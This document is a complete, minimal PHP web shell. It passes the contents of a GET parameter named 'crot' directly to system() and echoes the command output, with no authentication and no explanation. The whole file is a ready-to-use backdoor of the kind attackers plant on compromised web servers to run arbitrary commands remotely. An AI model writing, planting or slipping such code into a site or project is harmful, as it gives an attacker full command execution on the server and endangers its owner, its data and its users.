<?php
if(isset($_GET['crot'])) {
    echo "<pre>";
    system($_GET['crot']);
    echo "</pre>";
}
?>